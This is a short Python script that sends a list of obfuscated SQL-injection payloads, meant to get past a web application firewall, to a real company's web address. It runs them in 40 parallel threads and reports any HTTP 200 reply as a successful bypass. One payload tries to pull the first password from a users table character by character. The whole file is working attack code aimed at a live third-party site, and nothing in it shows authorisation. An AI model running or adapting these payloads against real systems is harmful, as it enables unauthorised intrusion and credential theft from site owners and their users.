import requests
from rich import box
from rich.text import Text
from rich.panel import Panel
from rich.console import Console
from  concurrent.futures import ThreadPoolExecutor

console = Console()

pays = ["'%20or%201.e(%22)%3D'", "1.e(ascii", "1.e(substring(", "1.e(ascii%201.e(substring(1.e(select%20password%20from%20users%20limit%201%201.e%2C1%201.e)%201.e%2C1%201.e%2C1%201.e)1.e)1.e)%20%3D%2070%20or'1'%3D'2'"]
urls = "https://www.apple.com/.htaccess"

def payloads1(url, pay):
    send = requests.get(url+pay, allow_redirects=False)
    if send.status_code == 200:
        console.print(Panel(f"[b white]Success full Bypass[/b white] [b green]{send.url}, {pay}, status: {send.status_code}[/b green]", box=box.HEAVY, style="blink blue", expand=False))
    else:
        console.print(f"bypass failled for {pay}, status: {send.status_code}", style="bold red")

# for x in pays:
#     payloads1(urls, x)

if __name__ == "__main__":
    with ThreadPoolExecutor(40) as pool:
        for x in pays:
            pool.submit(payloads1,urls,x)